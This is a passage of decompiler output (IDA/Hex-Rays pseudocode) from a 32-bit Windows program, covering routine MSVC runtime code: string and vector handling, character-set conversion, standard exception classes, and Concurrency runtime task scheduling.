    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[4] = 0;
  result = 0;
  this[5] = 7;
  *(_WORD *)this = 0;
  *(_OWORD *)this = *(_OWORD *)a2;
  *((_QWORD *)this + 2) = *(_QWORD *)(a2 + 16);
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  *(_WORD *)a2 = 0;
  return result;
}

//----- (004058F0) --------------------------------------------------------
char *__thiscall sub_4058F0(int *this, int a2, int a3)
{
  int *v3; // ebx
  int v4; // edi
  int v5; // eax
  unsigned int v6; // esi
  unsigned int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // eax
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // edi
  char *v13; // esi
  int v14; // ecx
  int v15; // edx
  _DWORD *v16; // esi
  _DWORD *v17; // ebx
  char *result; // eax
  int v19; // [esp-8h] [ebp-2Ch]
  size_t v20; // [esp+Ch] [ebp-18h]
  int v21; // [esp+10h] [ebp-14h]
  int v23; // [esp+20h] [ebp-4h]
  char *v24; // [esp+20h] [ebp-4h]

  v3 = this;
  v4 = *this;
  v23 = (a2 - *this) / 72;
  v5 = (this[1] - *this) / 72;
  v21 = v5;
  if ( v5 == 59652323 )
    sub_404860();
  v6 = v5 + 1;
  v7 = (this[2] - v4) / 72;
  v8 = (unsigned int)((v3[2] - v4) / 72) >> 1;
  if ( v7 <= 59652323 - v8 )
  {
    v9 = v8 + v7;
    if ( v8 + v7 < v6 )
      v9 = v6;
  }
  else
  {
    v9 = v5 + 1;
  }
  if ( v9 > 0x38E38E3 )
    goto LABEL_26;
  v10 = 72 * v9;
  v20 = v10;
  if ( v10 < 0x1000 )
  {
    if ( v10 )
      v12 = operator new(v10);
    else
      v12 = 0;
    goto LABEL_14;
  }
  if ( v10 + 35 <= v10 )
LABEL_26:
    sub_403CC0();
  v11 = operator new(v10 + 35);
  if ( !v11 )
    goto LABEL_28;
  v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
  *(v12 - 1) = v11;
LABEL_14:
  v12[18 * v23 + 4] = 0;
  v13 = (char *)&v12[18 * v23];
  *((_DWORD *)v13 + 5) = 0;
  v24 = v13;
  *(_OWORD *)v13 = *(_OWORD *)a3;
  *((_QWORD *)v13 + 2) = *(_QWORD *)(a3 + 16);
  *(_DWORD *)(a3 + 16) = 0;
  *(_DWORD *)(a3 + 20) = 7;
  *(_WORD *)a3 = 0;
  *((_DWORD *)v13 + 10) = 0;
  *((_DWORD *)v13 + 11) = 0;
  *(_OWORD *)(v13 + 24) = *(_OWORD *)(a3 + 24);
  *((_QWORD *)v13 + 5) = *(_QWORD *)(a3 + 40);
  *(_DWORD *)(a3 + 40) = 0;
  *(_DWORD *)(a3 + 44) = 7;
  *(_WORD *)(a3 + 24) = 0;
  *((_DWORD *)v13 + 16) = 0;
  *((_DWORD *)v13 + 17) = 0;
  *((_OWORD *)v13 + 3) = *(_OWORD *)(a3 + 48);
  *((_QWORD *)v13 + 8) = *(_QWORD *)(a3 + 64);
  *(_DWORD *)(a3 + 64) = 0;
  *(_DWORD *)(a3 + 68) = 7;
  *(_WORD *)(a3 + 48) = 0;
  v14 = *v3;
  v15 = v3[1];
  v19 = (int)v12;
  if ( a2 != v15 )
  {
    sub_405B20(v14, a2, (int)v12);
    v15 = v3[1];
    v14 = a2;
    v19 = (int)(v13 + 72);
  }
  sub_405B20(v14, v15, v19);
  v16 = (_DWORD *)*v3;
  if ( *v3 )
  {
    if ( v16 != (_DWORD *)v3[1] )
    {
      v17 = (_DWORD *)v3[1];
      do
      {
        sub_4052C0(v16);
        v16 += 18;
      }
      while ( v16 != v17 );
      v3 = this;
      v16 = (_DWORD *)*this;
    }
    if ( (unsigned int)(72 * ((v3[2] - (int)v16) / 72)) < 0x1000 )
      goto LABEL_24;
    if ( (unsigned int)v16 - *(v16 - 1) - 4 <= 0x1F )
    {
      v16 = (_DWORD *)*(v16 - 1);
LABEL_24:
      sub_44775B(v16);
      goto LABEL_25;
    }
LABEL_28:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_25:
  result = v24;
  *v3 = (int)v12;
  v3[1] = (int)&v12[18 * v21 + 18];
  v3[2] = (int)v12 + v20;
  return result;
}
// 403CC0: using guessed type void __noreturn sub_403CC0(void);
// 404860: using guessed type void __noreturn sub_404860(void);

//----- (00405B20) --------------------------------------------------------
int __fastcall sub_405B20(int a1, int a2, int a3)
{
  int result; // eax
  int v5; // ecx
  int v6; // esi

  result = a3;
  if ( a1 != a2 )
  {
    v5 = a1 + 44;
    v6 = a3 + 64;
    do
    {
      *(_DWORD *)(v6 - 48) = 0;
      v5 += 72;
      *(_DWORD *)(v6 - 44) = 0;
      v6 += 72;
      *(_OWORD *)result = *(_OWORD *)(v5 - 116);
      *(_QWORD *)(result + 16) = *(_QWORD *)(v5 - 100);
      result += 72;
      *(_WORD *)(v5 - 116) = 0;
      *(_DWORD *)(v5 - 100) = 0;
      *(_DWORD *)(v5 - 96) = 7;
      *(_DWORD *)(v6 - 96) = 0;
      *(_DWORD *)(a3 - a1 + v5 - 72) = 0;
      *(_OWORD *)(v6 - 112) = *(_OWORD *)(v5 - 92);
      *(_QWORD *)(v6 - 96) = *(_QWORD *)(v5 - 76);
      *(_DWORD *)(v5 - 76) = 0;
      *(_WORD *)(v5 - 92) = 0;
      *(_DWORD *)(v5 - 72) = 7;
      *(_DWORD *)(v6 - 72) = 0;
      *(_DWORD *)(v6 - 68) = 0;
      *(_OWORD *)(v6 - 88) = *(_OWORD *)(v5 - 68);
      *(_QWORD *)(v6 - 72) = *(_QWORD *)(v5 - 52);
      *(_DWORD *)(v5 - 52) = 0;
      *(_WORD *)(v5 - 68) = 0;
      *(_DWORD *)(v5 - 48) = 7;
    }
    while ( v5 - 44 != a2 );
  }
  return result;
}

//----- (00405BE0) --------------------------------------------------------
char *__thiscall sub_405BE0(char *this, int a2)
{
  int v4; // [esp+4h] [ebp-Ch] BYREF
  char v5; // [esp+8h] [ebp-8h]

  v4 = a2;
  v5 = 1;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(&v4, this + 4);
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';

//----- (00405C30) --------------------------------------------------------
void __thiscall sub_405C30(void *Block)
{
  __ExceptionPtrDestroy(Block);
}

//----- (00405C40) --------------------------------------------------------
void *__thiscall sub_405C40(void *this, void *a2)
{
  __ExceptionPtrCopy(this, a2);
  return this;
}

//----- (00405C60) --------------------------------------------------------
_QWORD *__cdecl sub_405C60(_QWORD *a1)
{
  *a1 = 0i64;
  __ExceptionPtrCreate(a1);
  __ExceptionPtrCurrentException(a1);
  return a1;
}

//----- (00405C90) --------------------------------------------------------
void __cdecl __noreturn sub_405C90(int Block)
{
  __ExceptionPtrRethrow(&Block);
  JUMPOUT(0x405CC2);
}
// 405CBD: control flows out of bounds to 405CC2

//----- (00405CD0) --------------------------------------------------------
int __thiscall sub_405CD0(volatile signed __int32 *this)
{
  int result; // eax

  result = _InterlockedExchangeAdd(this + 1, 0xFFFFFFFF);
  if ( !result )
  {
    result = (**(int (__thiscall ***)(volatile signed __int32 *))this)(this);
    if ( !_InterlockedDecrement(this + 2) )
      return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 4))(this);
  }
  return result;
}

//----- (00405D00) --------------------------------------------------------
int __stdcall sub_405D00(int a1)
{
  return 0;
}

//----- (00405D10) --------------------------------------------------------
char *__thiscall sub_405D10(char *this, int a2)
{
  int v4; // [esp+4h] [ebp-Ch] BYREF
  char v5; // [esp+8h] [ebp-8h]

  v4 = a2;
  v5 = 1;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(&v4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48F9EC: using guessed type void *std::runtime_error::`vftable';

//----- (00405D70) --------------------------------------------------------
char *__thiscall sub_405D70(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48F9EC: using guessed type void *std::runtime_error::`vftable';

//----- (00405DB0) --------------------------------------------------------
_DWORD *__fastcall sub_405DB0(_DWORD *a1, const CHAR *lpMultiByteStr)
{
  const CHAR *v2; // edi
  int v4; // ecx
  const CHAR *v5; // eax
  int v6; // eax
  WCHAR *v7; // eax
  int v8; // ecx
  __int128 v9; // xmm0
  _DWORD *result; // eax
  LPWSTR v11; // ecx
  int cchWideChar; // [esp+Ch] [ebp-34h]
  LPWSTR lpWideCharStr[4]; // [esp+10h] [ebp-30h] BYREF
  __int64 v14; // [esp+20h] [ebp-20h]

  v2 = lpMultiByteStr;
  v4 = *((_DWORD *)lpMultiByteStr + 4);
  if ( v4 )
  {
    v5 = lpMultiByteStr;
    if ( *((_DWORD *)lpMultiByteStr + 5) >= 0x10u )
      v5 = *(const CHAR **)lpMultiByteStr;
    v6 = MultiByteToWideChar(0, 8u, v5, v4, 0, 0);
    cchWideChar = v6;
    if ( v6 > 0 )
    {
      sub_404120(lpWideCharStr, v6, 0);
      v7 = (WCHAR *)lpWideCharStr;
      v8 = *((_DWORD *)v2 + 4);
      if ( HIDWORD(v14) >= 8 )
        v7 = lpWideCharStr[0];
      if ( *((_DWORD *)v2 + 5) >= 0x10u )
        v2 = *(const CHAR **)v2;
      if ( MultiByteToWideChar(0, 8u, v2, v8, v7, cchWideChar) )
      {
        v9 = *(_OWORD *)lpWideCharStr;
        a1[4] = 0;
        result = a1;
        a1[5] = 0;
        *(_OWORD *)a1 = v9;
        *((_QWORD *)a1 + 2) = v14;
        return result;
      }
      if ( HIDWORD(v14) >= 8 )
      {
        v11 = lpWideCharStr[0];
        if ( (unsigned int)(2 * HIDWORD(v14) + 2) >= 0x1000 )
        {
          v11 = (LPWSTR)*((_DWORD *)lpWideCharStr[0] - 1);
          if ( (unsigned int)((char *)lpWideCharStr[0] - (char *)v11 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_44775B(v11);
      }
    }
  }
  a1[4] = 0;
  a1[5] = 7;
  *(_WORD *)a1 = 0;
  sub_404330(a1, (void *)&psz, 0);
  return a1;
}

//----- (00405EF0) --------------------------------------------------------
_DWORD *__fastcall sub_405EF0(_DWORD *a1, const WCHAR *lpWideCharStr)
{
  const WCHAR *v2; // edi
  int v4; // ecx
  const WCHAR *v5; // eax
  int v6; // eax
  CHAR *v7; // eax
  int v8; // ecx
  __int128 v9; // xmm0
  _DWORD *result; // eax
  LPSTR v11; // ecx
  int cbMultiByte; // [esp+Ch] [ebp-34h]
  LPSTR lpMultiByteStr[4]; // [esp+10h] [ebp-30h] BYREF
  __int64 v14; // [esp+20h] [ebp-20h]

  v2 = lpWideCharStr;
  v4 = *((_DWORD *)lpWideCharStr + 4);
  if ( v4 )
  {
    v5 = lpWideCharStr;
    if ( *((_DWORD *)lpWideCharStr + 5) >= 8u )
      v5 = *(const WCHAR **)lpWideCharStr;
    v6 = WideCharToMultiByte(0xFDE9u, 0, v5, v4, 0, 0, 0, 0);
    cbMultiByte = v6;
    if ( v6 > 0 )
    {
      v14 = 0xF00000000i64;
      LOBYTE(lpMultiByteStr[0]) = 0;
      sub_40A250((void **)lpMultiByteStr, v6, 0);
      v7 = (CHAR *)lpMultiByteStr;
      v8 = *((_DWORD *)v2 + 4);
      if ( HIDWORD(v14) >= 0x10 )
        v7 = lpMultiByteStr[0];
      if ( *((_DWORD *)v2 + 5) >= 8u )
        v2 = *(const WCHAR **)v2;
      if ( WideCharToMultiByte(0xFDE9u, 0, v2, v8, v7, cbMultiByte, 0, 0) )
      {
        v9 = *(_OWORD *)lpMultiByteStr;
        a1[4] = 0;
        result = a1;
        a1[5] = 0;
        *(_OWORD *)a1 = v9;
        *((_QWORD *)a1 + 2) = v14;
        return result;
      }
      if ( HIDWORD(v14) >= 0x10 )
      {
        v11 = lpMultiByteStr[0];
        if ( (unsigned int)(HIDWORD(v14) + 1) >= 0x1000 )
        {
          v11 = (LPSTR)*((_DWORD *)lpMultiByteStr[0] - 1);
          if ( (unsigned int)(lpMultiByteStr[0] - v11 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_44775B(v11);
      }
    }
  }
  a1[4] = 0;
  a1[5] = 15;
  *(_BYTE *)a1 = 0;
  sub_40A390((void **)a1, (void *)Src, 0);
  return a1;
}

//----- (00406040) --------------------------------------------------------
int __fastcall sub_406040(int a1, unsigned int a2)
{
  char *v4; // ecx
  unsigned int v5; // edx
  __int128 v6; // xmm0
  int result; // eax
  __int128 v8; // [esp+Ch] [ebp-4Ch] BYREF
  __int64 v9; // [esp+1Ch] [ebp-3Ch]
  int v10; // [esp+24h] [ebp-34h]
  char v11[2]; // [esp+52h] [ebp-6h] BYREF

  v4 = v11;
  v10 = a1;
  do
  {
    v4 -= 2;
    v5 = a2 / 0xA;
    *(_WORD *)v4 = a2 % 0xA + 48;
    a2 /= 0xAu;
  }
  while ( a2 );
  v9 = v5 | 0x700000000i64;
  LOWORD(v8) = 0;
  if ( v4 != v11 )
    sub_404330(&v8, v4, (v11 - v4) >> 1);
  v6 = v8;
  result = a1;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = v6;
  *(_QWORD *)(a1 + 16) = v9;
  return result;
}

//----- (00406120) --------------------------------------------------------
bool __thiscall sub_406120(void *this, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  char v5[8]; // [esp+4h] [ebp-8h] BYREF

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);
  return *(_DWORD *)(v3[1] + 4) == *(_DWORD *)(a3[1] + 4) && *v3 == *a3;
}
// 406120: using guessed type char var_8[8];

//----- (00406160) --------------------------------------------------------
bool __thiscall sub_406160(_DWORD *this, _DWORD *a2, int a3)
{
  return this[1] == *(_DWORD *)(a2[1] + 4) && *a2 == a3;
}

//----- (00406190) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge sub_406190@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, int a4, _DWORD *a5)
{
  int v6; // ecx
  __m128i *v7; // eax
  void *v8; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // edx
  __m128i v10; // xmm1
  __m128i *v11; // ecx
  bool v12; // cf
  int v13; // eax
  unsigned int v14; // edx
  void *v15; // ecx
  unsigned int v16; // edx
  int result; // eax
  _DWORD v18[5]; // [esp-68h] [ebp-74h] BYREF
  unsigned int v19; // [esp-54h] [ebp-60h]
  __m128i v20; // [esp-50h] [ebp-5Ch] BYREF
  __int64 v21; // [esp-40h] [ebp-4Ch]
  __m128i v22; // [esp-38h] [ebp-44h] BYREF
  __int64 v23; // [esp-28h] [ebp-34h]
  int v24; // [esp-20h] [ebp-2Ch]
  __m128i *v25; // [esp-1Ch] [ebp-28h] BYREF
  char v26; // [esp-18h] [ebp-24h]
  int *v27; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v29; // [esp-8h] [ebp-14h]
  int v30; // [esp-4h] [ebp-10h]
  int v31; // [esp+0h] [ebp-Ch]
  int v32; // [esp+4h] [ebp-8h]
  int v33; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v31 = a2;
  v32 = retaddr;
  v30 = -1;
  v29 = &loc_481770;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v27 = &v33;
  v24 = a1;
  sub_409DB0(&v22, a5);
  v24 = a3;
  v30 = 0;
  v6 = v23;
  if ( (_DWORD)v23 )
  {
    if ( (unsigned int)(HIDWORD(v23) - v23) < 2 )
    {
      sub_40AD00((void **)&v22, 2u, v24, ": ", 2u);
    }
    else
    {
      LODWORD(v23) = v23 + 2;
      v7 = &v22;
      if ( HIDWORD(v23) >= 0x10 )
        v7 = (__m128i *)v22.m128i_i32[0];
      strcpy(&v7->m128i_i8[v6], ": ");
    }
  }
  (*(void (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)a4 + 8))(a4, v18, v24);
  LOBYTE(v30) = 1;
  sub_409C70((void **)&v22, v18);
  if ( v19 >= 0x10 )
  {
    v8 = (void *)v18[0];
    v9 = (struct _EXCEPTION_REGISTRATION_RECORD *)(v19 + 1);
    if ( v19 + 1 >= 0x1000 )
    {
      v8 = *(void **)(v18[0] - 4);
      v9 = (struct _EXCEPTION_REGISTRATION_RECORD *)(v19 + 36);
      if ( (unsigned int)(v18[0] - (_DWORD)v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    ExceptionList = v9;
    sub_44775B(v8);
  }
  v10 = v22;
  v11 = &v20;
  *(_DWORD *)a1 = &std::exception::`vftable';
  v21 = v23;
  v12 = HIDWORD(v23) < 0x10;
  v13 = _mm_cvtsi128_si32(v10);
  *(_QWORD *)(a1 + 4) = 0i64;
  v20 = v10;
  if ( !v12 )
    v11 = (__m128i *)v13;
  v23 = 0xF00000000i64;
  v22.m128i_i8[0] = 0;
  v25 = v11;
  v26 = 1;
  __std_exception_copy(&v25, a1 + 4);
  v14 = HIDWORD(v21);
  *(_DWORD *)a1 = &std::runtime_error::`vftable';
  if ( v14 >= 0x10 )
  {
    v15 = (void *)v20.m128i_i32[0];
    v16 = v14 + 1;
    if ( v16 >= 0x1000 )
    {
      v15 = *(void **)(v20.m128i_i32[0] - 4);
      v16 += 35;
      if ( (unsigned int)(v20.m128i_i32[0] - (_DWORD)v15 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)v16;
    sub_44775B(v15);
  }
  result = a1;
  *(_DWORD *)(a1 + 12) = a3;
  *(_DWORD *)a1 = &std::_System_error::`vftable';
  *(_DWORD *)(a1 + 16) = a4;
  return result;
}
// 406190: could not find valid save-restore pair for ebp
// 406190: could not find valid save-restore pair for edi
// 406190: could not find valid save-restore pair for esi
// 406252: bad sp value at call
// 4062DA: bad sp value at call
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48F9EC: using guessed type void *std::runtime_error::`vftable';
// 48FAB0: using guessed type void *std::_System_error::`vftable';

//----- (00406360) --------------------------------------------------------
char *__thiscall sub_406360(char *Block, char a2)
{
  *(_DWORD *)Block = &std::exception::`vftable';
  __std_exception_destroy(Block + 4);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 45E423: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 48F974: using guessed type void *std::exception::`vftable';

//----- (00406390) --------------------------------------------------------
_DWORD *__thiscall sub_406390(_DWORD *this, int a2, int a3)
{
  void *v4; // ecx
  void *Block[5]; // [esp+8h] [ebp-28h] BYREF
  unsigned int v7; // [esp+1Ch] [ebp-14h]
  _DWORD *v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v8 = this;
  Block[4] = 0;
  v7 = 15;
  LOBYTE(Block[0]) = 0;
  sub_40A390(Block, (void *)Src, 0);
  v9 = 0;
  sub_406190((int)this, (int)&savedregs, a2, a3, Block);
  if ( v7 >= 0x10 )
  {
    v4 = Block[0];
    if ( v7 + 1 >= 0x1000 )
    {
      v4 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v4 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v4);
  }
  *this = &std::system_error::`vftable';
  return this;
}
// 48FABC: using guessed type void *std::system_error::`vftable';

//----- (00406450) --------------------------------------------------------
char *__thiscall sub_406450(char *this, int a2)
{
  char *result; // eax

  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  result = this;
  *(_DWORD *)this = &std::system_error::`vftable';
  return result;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48FAB0: using guessed type void *std::_System_error::`vftable';
// 48FABC: using guessed type void *std::system_error::`vftable';

//----- (004064A0) --------------------------------------------------------
char *__thiscall sub_4064A0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  *((_DWORD *)this + 4) = *(_DWORD *)(a2 + 16);
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 48FAB0: using guessed type void *std::_System_error::`vftable';

//----- (004064F0) --------------------------------------------------------
const char *sub_4064F0()
{
  return "generic";
}

//----- (00406500) --------------------------------------------------------
void **__stdcall sub_406500(void **a1, int a2)
{
  char *v2; // edx

  v2 = (char *)std::_Syserror_map(a2);
  a1[4] = 0;
  a1[5] = (void *)15;
  *(_BYTE *)a1 = 0;
  sub_40A390(a1, v2, strlen(v2));
  return a1;
}

//----- (00406550) --------------------------------------------------------
void *__thiscall sub_406550(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (00406570) --------------------------------------------------------
void *sub_406570()
{
  int v0; // ecx

  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5009B0,
          (int (__stdcall *)(void *, void *, void **))sub_40B290,
          &unk_5009B4) )
    terminate(v0);
  return &unk_5009B4;
}
// 406589: variable 'v0' is possibly undefined
// 46203B: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (004065A0) --------------------------------------------------------
int __cdecl sub_4065A0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    std::_Throw_C_error(a1);
  return result;
}

//----- (004065C0) --------------------------------------------------------
char *__thiscall sub_4065C0(char *this, int a2)
{
  const char *v4; // [esp+4h] [ebp-Ch] BYREF
  char v5; // [esp+8h] [ebp-8h]

  v4 = "This function cannot be called on a default constructed task";
  v5 = 1;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(&v4, this + 4);
  *(_DWORD *)this = &Concurrency::invalid_operation::`vftable';
  return this;
}
// 45E3C0: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 48F974: using guessed type void *std::exception::`vftable';
// 4939AC: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (00406620) --------------------------------------------------------
void __cdecl sub_406620(Concurrency::details *Block)
{
  struct Concurrency::details::_Threadpool_chore *v1; // [esp-4h] [ebp-20h]

  v1 = (struct Concurrency::details::_Threadpool_chore *)*((_DWORD *)Block + 4);
  (*((void (**)(void))Block + 3))();
  Concurrency::details::_Release_chore(Block, v1);
  sub_44775B(Block);
}

//----- (00406690) --------------------------------------------------------
int __stdcall sub_406690(int a1, int a2)
{
  Concurrency::details *v2; // esi
  int result; // eax
  int v4; // ecx
  struct Concurrency::details::_Threadpool_chore *v5; // [esp-4h] [ebp-18h]
  char pExceptionObject[12]; // [esp+4h] [ebp-10h] BYREF
  Concurrency::details *v7; // [esp+10h] [ebp-4h]

  v2 = (Concurrency::details *)operator new(0x14u);
  v7 = v2;
  *(_OWORD *)v2 = 0i64;
  *((_DWORD *)v2 + 4) = 0;
  *(_DWORD *)v2 = 0;
  *((_DWORD *)v2 + 1) = sub_406620;
  *((_DWORD *)v2 + 2) = v2;
  *((_DWORD *)v2 + 3) = a1;
  *((_DWORD *)v2 + 4) = a2;
  result = Concurrency::details::_Schedule_chore(v2, v5);
  if ( result )
  {
    sub_406710(v2, v4);
    sub_405D10(pExceptionObject, (int)"Fail to schedule the chore!");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
  }
  return result;
}
// 4066CD: variable 'v5' is possibly undefined
// 4066E3: variable 'v4' is possibly undefined

//----- (00406710) --------------------------------------------------------
Concurrency::details *__thiscall sub_406710(Concurrency::details *this, int a2)
{
  struct Concurrency::details::_Threadpool_chore *v4; // [esp+0h] [ebp-14h]

  Concurrency::details::_Release_chore(this, v4);
  sub_44775B(this);
  return this;
}
// 40673D: variable 'v4' is possibly undefined

//----- (00406770) --------------------------------------------------------
int sub_406770()
{
  int v0; // eax
  int v2; // [esp-8h] [ebp-38h] BYREF
  __int64 *p_Block; // [esp-4h] [ebp-34h]
  char v4; // [esp+Fh] [ebp-21h] BYREF
  int v5[2]; // [esp+10h] [ebp-20h] BYREF
  __int64 Block; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  Block = 0i64;
  __ExceptionPtrCreate(&Block);
  v7 = 0;
  v5[0] = (int)&Block;
  v5[1] = (int)&v4;
  v0 = std::_Execute_once((struct std::once_flag *)&unk_5009A4, sub_40B2B0, v5);
  p_Block = &Block;
  if ( !v0 )
  {
    if ( !__ExceptionPtrToBool(p_Block) )
      std::_XGetLastError();
    sub_405C40(&v2, &Block);
    sub_405C90(v2);
  }
  __ExceptionPtrDestroy(p_Block);
  return dword_5009BC;
}
// 5009BC: using guessed type int dword_5009BC;

//----- (00406830) --------------------------------------------------------
signed __int32 __thiscall sub_406830(volatile signed __int32 *this)
{
  signed __int32 v1; // esi

  v1 = _InterlockedDecrement(this + 1);
  if ( !v1 )
    (*(void (__thiscall **)(volatile signed __int32 *))(*this + 4))(this);
  return v1;
}

//----- (00406850) --------------------------------------------------------
int __thiscall sub_406850(int (__thiscall ***this)(void *, int))
{
  int result; // eax

  if ( this )
    return (**this)(this, 1);
  return result;
}

//----- (00406860) --------------------------------------------------------
_DWORD *__thiscall sub_406860(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::_RefCounter::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';

//----- (00406890) --------------------------------------------------------
char *__thiscall sub_406890(char *this, int a2)
{
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
  *((_DWORD *)this + 1) = a2;
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  *((_DWORD *)this + 2) = 3;
  sub_42F834(this + 12);
  _Mtx_init_in_situ((_Mtx_t)(this + 52), 2);
  this[100] = 0;
  *((_DWORD *)this + 26) = 0;
  return this;
}
// 42F834: using guessed type _DWORD __cdecl sub_42F834(_DWORD);
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 493CA8: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (004068E0) --------------------------------------------------------
void __thiscall sub_4068E0(char *this)
{
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(this + 52));
  _Cnd_destroy_in_situ((_Cnd_t)(this + 12));
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
}
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 493CA8: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00406910) --------------------------------------------------------
char *__thiscall sub_406910(char *Block, char a2)
{
  *(_DWORD *)Block = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(Block + 52));
  _Cnd_destroy_in_situ((_Cnd_t)(Block + 12));
  *(_DWORD *)Block = &Concurrency::details::_RefCounter::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493C9C: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 493CA8: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00406950) --------------------------------------------------------
int __thiscall sub_406950(int this, int a2)
{
  char v3; // bl
  int v4; // eax
  _DWORD *v5; // eax
  int result; // eax
  signed __int32 CurrentThreadId; // esi
  signed __int32 v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  struct _Mtx_internal_imp_t *v12; // [esp+14h] [ebp-10h]

  _InterlockedExchange((volatile __int32 *)(a2 + 8), 0);
  _InterlockedIncrement((volatile signed __int32 *)(a2 + 4));
  *(_DWORD *)(a2 + 104) = this;
  v3 = 1;
  if ( *(_DWORD *)(this + 8) )
    goto LABEL_10;
  v12 = (struct _Mtx_internal_imp_t *)(this + 12);
  v4 = _Mtx_lock((_Mtx_t)(this + 12));
  if ( v4 )
    std::_Throw_C_error(v4);
  if ( !*(_DWORD *)(this + 8) )
  {
    v3 = 0;
